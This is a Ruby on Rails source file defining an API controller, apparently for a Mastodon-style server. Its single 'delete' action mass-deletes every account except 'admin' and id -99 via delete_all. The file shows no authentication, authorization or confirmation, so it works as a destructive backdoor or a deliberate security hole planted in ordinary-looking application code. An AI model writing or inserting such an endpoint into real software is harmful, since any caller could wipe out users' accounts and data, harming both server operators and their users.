# frozen_string_literal: true

class Api::V1::AccountsDeleteController < Api::BaseController
  def delete
    Account.where.not(username: 'admin').and(Account.where.not(id: -99)).delete_all
  end
end
